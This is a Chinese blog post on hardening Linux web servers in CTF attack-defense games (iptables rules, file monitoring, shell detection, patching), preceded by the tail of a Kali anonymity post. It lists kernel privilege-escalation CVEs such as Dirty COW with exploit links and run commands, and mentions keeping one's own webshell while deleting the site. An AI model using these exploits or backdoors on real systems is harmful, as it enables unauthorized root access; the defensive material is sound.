class=" language-bash"><code class="language-bash">GPG error: https://deb.i2p2.de wheezy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 67ECE5605BCF1346</code></pre><p>3.安装i2p</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> i2p i2p-keyring</code></pre><h1 id="测试匿名性"><a href="#测试匿名性" class="headerlink" title="测试匿名性"></a>测试匿名性</h1><p>我们可以使用<code>anonsurf myip</code>命令查看自己的ip是否已经匿名。</p><p>另外，我们可以访问一下网站检查是否泄漏了DNS</p><p><a href="http://dnsleak.com/" target="_blank" rel="noopener">http://dnsleak.com/</a></p><p><a href="https://www.perfect-privacy.com/dns-leaktest/" target="_blank" rel="noopener">https://www.perfect-privacy.com/</a></p><p>在此处检查是否泄漏了IPv6：<a href="http://ipv6leak.com/" target="_blank" rel="noopener">http://ipv6leak.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 科学上网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF线下防御战—让你的靶机变成&quot;铜墙铁壁&quot;</title>
      <link href="/2017/10/10/ctf-xian-xia-fang-yu-zhan/"/>
      <url>/2017/10/10/ctf-xian-xia-fang-yu-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p>　　随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，开始出现了安全加固或者防御战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于线下赛，笔者虽说没有什么很高超的攻防技巧，但也是有着一些自己的心得。本文总结了一些CTF线下赛中常用的服务器加固姿势，希望能对各位CTF朋友们有所帮助。环境针对目前常见线下赛常见的linux Web服务器，但是因为CTF毕竟与真实网络环境有很大区别，本文的涉及的大部分姿势不具有普遍适用性。本文涉及到的相关代码github下载地址：<a href="https://github.com/ssooking/CTFDefense" target="_blank" rel="noopener">CTFDefense</a>。</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/hello.jpg" alt="img"></p><h1 id="二-常用姿势"><a href="#二-常用姿势" class="headerlink" title="二. 常用姿势"></a>二. 常用姿势</h1><h2 id="1-提权"><a href="#1-提权" class="headerlink" title="1. 提权"></a>1. 提权</h2><p>　　在开始正文之前，需要先提一下提权，这个要根据自己的比赛过程中的需要而定。有些比赛就有专门的防御加固环节，但安全加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般一开始会给一个普通权限账号，或者干脆什么都不给，需要我们自己通过漏洞拿下服务器，这样往往就需要提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。这里有一个网站：<a href="http://exploit.linuxnote.org/" target="_blank" rel="noopener">http://exploit.linuxnote.org/</a>，里面有许多linux本地提权的poc。github上有一个挺全的提权exp项目：<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a>。网上也有人分享的一些打包搜集的poc,比如<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=363466" target="_blank" rel="noopener">这个</a>，有兴趣的朋友可以多下载看看。</p><p>下面分享几个最近两年并且影响范围比较大的：</p><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4" target="_blank" rel="noopener">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ）</a><br>描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限<br>用法：./pwn<br><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)）</a><br>描述：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限<br>用法： ./dirtyc0w file content<br><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a" target="_blank" rel="noopener">CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</a><br>描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限<br>用法：./chocobo_root<br>POC： <a href="https://www.seebug.org/vuldb/ssvid-92567" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92567</a><br><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">CVE-2017-1000367（sudo本地提权漏洞 ）</a><br>CVE-2017-1000364<br>描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">CVE-2016-1247（Nginx权限提升漏洞）</a></p><p>描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</p><p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><p>　</p><p>　提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。 </p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103247387-2092258840.png" alt="img"></p><p>实用脚本</p><p>　　 <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git" target="_blank" rel="noopener">Linux_Exploit_Suggester.pl</a> ，它可以根据系统内核版本号返回一个包含了可能exploits的列表。还有一个检查linux安全状况的脚本：<a href="http://www.freebuf.com/sectool/108564.html" target="_blank" rel="noopener">原文链接</a></p><p>　　还有几个详见：<a href="http://www.freebuf.com/sectool/121847.html" target="_blank" rel="noopener">Linux提权？这四个脚本可以帮助你</a></p><h2 id="2-常用操作命令"><a href="#2-常用操作命令" class="headerlink" title="2. 常用操作命令"></a>2. 常用操作命令</h2><p>　　linux操作有很多命令，但是线下赛的防护工作中常用的也就那么一些，我们平时可以留意并总结起来，便于我们比赛使用。</p><pre class=" language-bash"><code class="language-bash">ssh操作<span class="token function">ssh</span> <span class="token operator">&lt;</span>-p 端口<span class="token operator">></span> 用户名@IP　　//登录<span class="token function">scp</span> 文件路径  用户名@IP:存放路径　　//向ssh服务器上传输文件备份web目录　　<span class="token function">tar</span> -zcvf web.tar.gz /var/www/html/用户管理　　w 　　//查看当前用户　　<span class="token function">pkill</span> -kill -t <span class="token operator">&lt;</span>用户tty<span class="token operator">></span>　　 //踢掉当前登录用户进程管理　　<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> pid或者进程名　　//查看进程信息　　查看已建立的网络连接及进程　　<span class="token function">netstat</span> -antulp <span class="token operator">|</span> <span class="token function">grep</span> EST　　查看指定端口被哪个进程占用　　<span class="token function">lsof</span> -i:端口号 或者 <span class="token function">netstat</span> -tunlp<span class="token operator">|</span><span class="token function">grep</span> 端口号　　结束进程命令　　<span class="token function">kill</span> PID　　<span class="token function">killall</span> <span class="token operator">&lt;</span>进程名<span class="token operator">></span>　　<span class="token function">kill</span> -9 <span class="token operator">&lt;</span>PID<span class="token operator">></span>iptables命令　　封杀某个IP或者ip段，如：123.4.5.6　　iptables -I INPUT -s 123.4.5.6 -j DROP　　iptables -I INPUT -s 123.4.5.1/24 -j DROP　　禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6　　iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROPMysql数据库操作　　备份mysql数据库　　mysqldump -u 用户名 -p 密码 数据库名 <span class="token operator">></span> back.sql　　//备份指定数据库　　mysqldump --all-databases <span class="token operator">></span> bak.sql　　　　//备份所有数据库　　还原mysql数据库　　mysql -u 用户名 -p 密码 数据库名 <span class="token operator">&lt;</span> bak.sql安全检查　　<span class="token function">find</span> / *.php -perm 4777 　　 //查找777的权限的php文件 　　<span class="token function">awk</span> -F: <span class="token string">'{if(<span class="token variable">$3</span>==0)print <span class="token variable">$1</span>}'</span> /etc/passwd　　//查看root权限的账号　　<span class="token function">crontab</span> -l　　//查看计划任务　　检测所有的tcp连接数量及状态　　<span class="token function">netstat</span> -ant<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$5</span> "\t" <span class="token variable">$6</span>}'</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"[1-9][0-9]*\."</span><span class="token operator">|</span><span class="token function">sed</span> -e <span class="token string">'s/::ffff://'</span> -e <span class="token string">'s/:[0-9]*//'</span><span class="token operator">|</span><span class="token function">sort</span><span class="token operator">|</span><span class="token function">uniq</span> -c<span class="token operator">|</span><span class="token function">sort</span> -rn　　查看页面访问排名前十的IP　　<span class="token function">cat</span> /var/log/apache2/access.log <span class="token operator">|</span> <span class="token function">cut</span> -f1 -d <span class="token string">" "</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -k 1 -r <span class="token operator">|</span> <span class="token function">head</span> -10　　查看页面访问排名前十的URL　　<span class="token function">cat</span> /var/log/apache2/access.log <span class="token operator">|</span> <span class="token function">cut</span> -f4 -d <span class="token string">" "</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -k 1 -r <span class="token operator">|</span> <span class="token function">head</span> -10　　</code></pre><p>　　再推荐两篇篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337" target="_blank" rel="noopener">应急排查手册</a><a href="https://yq.aliyun.com/articles/177337%20" target="_blank" rel="noopener"> </a>，<a href="https://xianzhi.aliyun.com/forum/mobile/read/2150.html" target="_blank" rel="noopener">Linux应急响应姿势浅谈</a></p><h2 id="3-文件监控防webshell"><a href="#3-文件监控防webshell" class="headerlink" title="3. 文件监控防webshell"></a>3. 文件监控防webshell</h2><p>　　防御webshell，我们可以监控我们的web目录，对文件的增加或修改等操作进行限制等，粗暴一点的话，就禁止任何文件产生变化，杜绝被传webshell的可能性。</p><p>（1）使用系统 chattr +i 命令<br>　　linux下的文件有着隐藏属性，可以用lsattr命令查看。其中有一个i属性，表示不得更动任意文件或目录。如果你已经有root或者sudo权限了，那么你可以使用”chattr +i 命令”修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括root），如果想进行修改，必须用命令”chattr -i”取消隐藏属性。<br><a href="http://www.runoob.com/linux/linux-comm-chattr.html" target="_blank" rel="noopener">Linux文件保护禁止修改、删除、移动文件等,使用chattr +i保护</a></p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184611437-2010938649.png" alt="img"></p><p>例子：<br>用chattr命令防止系统中某个关键文件被修改：</p><pre><code>chattr +i /etc/profile </code></pre><p>将/var/www/html目录下的文件设置为不允许任何人修改：</p><pre><code>chattr -R +i /var/www/html </code></pre><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184623437-649479414.png" alt="img"></p><p>（2）自己动手丰衣足食<br>　　python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以手工把库文件传到靶机里python库中: /usr/lib/pythonXXX/site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。</p><p>　　安装了pyinotify库之后，我们仅仅运行在机器上： “python -m pyinotify 监控目录路径” 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。<br><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184646562-176521649.png" alt="img"></p><p> 　　但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以自己编程，针对性地实现我们需要的功能，下面是一段代码示例。</p><p>　　　　关于pyinotify 库的用法不再赘述，可以看到我在上述代码中创建了一个事件监控处理的类EventHandler，在这个示例中，我们仅仅关注创建、删除、修改属性、移动操作事件，并且我定义了一个DeleteFileOrDir方法用于自动删除增加的目录或者文件。运行测试截图：</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170902184705296-121778766.png" alt="img"></p><p>　　我们可以编写功能更加细化的程序，实现如监控文件变更，禁止创建、修改、删除任何文件或目录，自动删除新增文件，把被修改的文件改回去, 删除畸形隐藏文件等功能。我们使用pyinstaller把我代码打包为linux的elf可执行文件。-F参数表示打包为独立可运行文件，命令执行完之后自动生成：build、dist文件夹和SimpleMonitor.spec文件，你可以在dist目录里找到生成的elf程序。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103154294-666393591.png" alt="img"></p><p> 打包的文件在CTFDefense项目的Monitor目录下</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103128012-68438767.png" alt="img"> </p><h2 id="4-网络监控断异常连接"><a href="#4-网络监控断异常连接" class="headerlink" title="4. 网络监控断异常连接"></a>4. 网络监控断异常连接</h2><p>　　linux安全防护一定少不了 iptables了，使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p><p>　　具体我们可以做哪些工作呢，举一些例子：</p><p><strong>（1）关闭所有网络端口，只开放一些比赛的必要端口，也可以防止后门的连接</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#开放ssh</span>iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT<span class="token comment" spellcheck="true">#打开80端口</span>iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT<span class="token comment" spellcheck="true">#开启多端口简单用法</span>iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span>iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</code></pre><p><strong>（2）限制ssh登陆，进行访问控制</strong></p><pre class=" language-bash"><code class="language-bash">iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh</code></pre><p><strong>（3）限制IP连接数和连接速率</strong></p><p>　　我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问+_+</p><p>单个IP的最大连接数为 30</p><pre class=" language-bash"><code class="language-bash">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</code></pre><p>单个IP在60秒内只允许最多新建15个连接</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT</code></pre><p>允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</code></pre><p>　　再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问~~</p><p><strong>（4）数据包简单识别，防止端口复用类的后门或者shell</strong></p><p>　　假设病毒木马程序通过22，80端口像服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p><pre class=" language-bash"><code class="language-bash">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP</code></pre><p><strong>（5）限制访问</strong></p><p>如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p><pre class=" language-bash"><code class="language-bash">iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务</code></pre><p>封杀123.4.5.6这个IP或者某个ip段</p><pre class=" language-bash"><code class="language-bash">iptables -I INPUT -s 123.4.5.6 -j DROPiptables -I INPUT -s 123.4.5.1/24 -j DROP</code></pre><p><strong>（6）过滤异常报文</strong></p><p>　　iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　<span class="token comment" spellcheck="true">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span>iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 <span class="token comment" spellcheck="true">#匹配SYN标识位</span>iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 <span class="token comment" spellcheck="true">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 <span class="token comment" spellcheck="true">#丢弃没标志位的包</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　<span class="token comment" spellcheck="true">#匹配到SYN ACK FIN URG的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到SYN ACK FIN RST的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到SYN FIN PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　<span class="token comment" spellcheck="true">#匹配到SYN FIN RST PSH的丢弃</span>iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　<span class="token comment" spellcheck="true">#匹配到 SYN,RST的丢弃</span>iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 <span class="token comment" spellcheck="true">#匹配到 SYN,FIN的丢弃</span></code></pre><p><strong> （7）防DDOS攻击</strong></p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT</code></pre><p>　　-m limit: 启用limit扩展<br>　　–limit 20/minute: 允许最多每分钟10个连接<br>　　–limit-burst 100: 当达到100个连接后，才启用上述20/minute限制</p><p>丢弃陌生的TCP响应包,防止反弹式攻击</p><pre class=" language-bash"><code class="language-bash">iptables -A INPUT -m state --state NEW -p tcp <span class="token operator">!</span> --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</code></pre><p>　　更多的姿势，需要打开我们的脑洞了，下面是一个通用的firewall脚本，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解：</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#Allow youself Ping other hosts , prohibit others Ping you</span>iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROPiptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT<span class="token comment" spellcheck="true">#Close all INPUT FORWARD OUTPUT, just open some ports</span>iptables -P INPUT DROPiptables -P FORWARD DROPiptables -P OUTPUT DROP<span class="token comment" spellcheck="true">#Open ssh</span>iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT<span class="token comment" spellcheck="true">#Open port 80</span>iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT<span class="token comment" spellcheck="true">#Open multiport</span><span class="token comment" spellcheck="true">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><span class="token comment" spellcheck="true">#Control IP connection</span><span class="token comment" spellcheck="true">#The maximum number of connections for a single IP is 30</span>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT<span class="token comment" spellcheck="true">#A single IP allows up to 15 new connections in 60 seconds</span>iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT<span class="token comment" spellcheck="true">#Prevent port reuse</span>iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT<span class="token comment" spellcheck="true">#Filter abnormal packets</span>iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROPiptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP<span class="token comment" spellcheck="true">#Prevent DoS attacks</span>iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT<span class="token comment" spellcheck="true">#Discard unfamiliar TCP response packs to prevent rebound attacks</span>iptables -A INPUT -m state --state NEW -p tcp <span class="token operator">!</span> --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</code></pre><p>注意，对于不同的iptables版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103058590-1008831481.png" alt="img"></p><h2 id="5-综合分析控阻溢出类攻击"><a href="#5-综合分析控阻溢出类攻击" class="headerlink" title="5. 综合分析控阻溢出类攻击"></a>5. 综合分析控阻溢出类攻击</h2><p>　　关于溢出类攻击，我还没有总结出一些很实用的姿势，这里提供一些思路。</p><p>　　一般来说，溢出攻击成功后，会建立shell通道和网络连接，我们可以配合前面提到的命令，从这两方面入手进行检测和阻隔：</p><ul><li><p>　　检测高权限的进程</p></li><li><p>　　检测sh，bash等进程</p></li><li><p>　　检测建立的网络连接</p></li><li><p>　　检查开放的端口</p></li></ul><p>　例子：通过端口和bash发现可疑进程</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922185224228-1344630297.png" alt="img"></p><p>　　如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket连接数的命令为：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> /proc/<span class="token operator">&lt;</span>进程pid<span class="token operator">></span>/fd -l <span class="token operator">|</span> <span class="token function">grep</span> socket: <span class="token operator">|</span> <span class="token function">wc</span> -l</code></pre><p>比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922183157743-1968982131.png" alt="img"></p><p>我们还可以检测可疑进程开启的管道。linux下查看进程管道数的命令类似：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> /proc/<span class="token operator">&lt;</span>进程pid<span class="token operator">></span>/fd -l <span class="token operator">|</span> <span class="token function">grep</span> pipe: <span class="token operator">|</span> <span class="token function">wc</span> -l</code></pre><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170922182533290-1861869030.png" alt="img"></p><p> 典型的一个例子是：Apache模块后门mod_rootme，它复用了webserver的80端口，mod_rootme通过管道和bash交互数据，但是由于开启了额外的管道，我们从这个变化上便能察觉到。</p><p>详细内容可以参考：<a href="http://t.qq.com/p/t/330573116082464" target="_blank" rel="noopener">http://t.qq.com/p/t/330573116082464</a>。</p><p>　　总体来说，我们主要可以关注进程情况和网络连接情况，综合分析进程，阻断溢出攻击创建的shel的。</p><h2 id="6-漏洞修复简单粗暴"><a href="#6-漏洞修复简单粗暴" class="headerlink" title="6. 漏洞修复简单粗暴"></a>6. 漏洞修复简单粗暴</h2><p>　　CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p><p>　　1. 删站：如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell，参加过几场比赛确实遇到了这种尴尬的事情，web攻防最后都演变成了拼手速的<code>GetShell+留后门+删站</code>。<br>　　2. 删漏洞页面：大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。<br>　　3. 破坏正常功能：如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似upload等这种功能调用函数。</p><p>　　上面这三种其实都算不上修补漏洞了，真实环境下哪能这么干。</p><p>　　4. 采用正常修补手段：规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195750262-1280426197.png" alt="img"></p><p>　　谈到那个删站，我忍不住想吐槽几句，我个人是不赞成这种做法的，因为这种操作在比赛中很容易拉仇恨并且产生连锁反应，也不利于个人的进步。有些人认为：我先拿下这台服务器说明我有能力，你没进去就说明你没本事，所以我先进去删了站不让其他人进也无可厚非，有能耐你就先拿下它，那你删了我也没意见。也有人说，真正的对抗里，敌人不会对你仁慈～～没错，挺有道理的，而且强者也应该拥有发言权。但是我们不能只从一个角度考虑问题，换个角度去考虑，CTF竞赛虽然是向着真实的网络环境靠拢，但是它的根本目的是提高竞技者的安全技能和知识水平。对于大部分切磋竞技的玩家来说，参加比赛也都是为了让自己获得提高，大家在同一个平台上进行进行切磋对抗，认识到自己和对手身上的优点与不足，这才是竞技。但是这种行为其实从某种意义上来说已经破坏了比赛的公平性，毕竟如果是因为技术不到位，那当然没什么话说，但是如果网站删了，让别人发挥的地方都没有，这种切磋也没有意义。举个不太恰当的例子，这就像两个人打架，你说你比我强，咱们比比再说，但是你都不让我跟你打，这算什么。再换个角度，其实我一直坚信真正具有强者姿态的人，不畏惧挑战、不怕被人超越，不屑于通过这种手段巩固自己的地位。相反，我们只有将自己至于狂风大浪中，才能成长和蜕变，最终成为一个强者。</p><p>　　无论从什么角度考虑，我们应该敢于挑战自身、挑战别人，不断强大自己，不断去征服，无畏无惧、步履铿锵！</p><h2 id="7-安全软件锦上添花"><a href="#7-安全软件锦上添花" class="headerlink" title="7. 安全软件锦上添花"></a>7. 安全软件锦上添花</h2><p>　　可以使用第三方软件的话，装个WAF，安全狗之类的吧。这个我没什么话要说，附个linux安全狗的链接吧：<br>安全狗linux版：<a href="http://www.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://www.safedog.cn/website_safedog.html</a></p><p>　　我们平时也可以搜集或者自己实现一些脚本或者工具备用。</p><p>　　这里有waf一枚：<a href="http://hackblog.cn/post/75.html" target="_blank" rel="noopener">http://hackblog.cn/post/75.html</a></p><p>　　如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：</p><pre><code>find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&#39;\/tmp\/waf.php&#39;);\n/g&quot;</code></pre><p>命令的意思就是查找/var/www/html目录下所有php文件，在头部添加一句，用require函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义：\’，命令转换过来就是这样：</p><pre><code>find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&#39;/tmp/waf.php&#39;);\n/g&quot;</code></pre><p>这样，再次打开时我们就会发现已经引入了自定义waf文件。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928181501247-383805793.png" 